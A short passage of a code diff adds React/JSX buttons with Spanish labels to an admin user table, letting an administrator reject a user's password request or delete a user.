+                                    onClick={() => handleUserDecision(u.id, 'REJECTED')}
+                                    className="px-2 py-0.5 rounded bg-rose-950/60 hover:bg-rose-600 hover:text-white text-rose-300 border border-rose-500/40 text-[10px] font-bold transition-all cursor-pointer"
+                                    title="Rechazar contraseña"
+                                  >
+                                    ✕ Rechazar
+                                  </button>
+                                </>
+                              )}
+                              <button
+                                onClick={() => handleDeleteUser(u.id, u.username)}
+                                className="text-red-400 hover:text-red-300 text-xs font-sans cursor-pointer hover:underline ml-1"
+                              >
+                                Eliminar
+                              </button>
+                            </div>
                           </td>
                         </tr>
                       ))
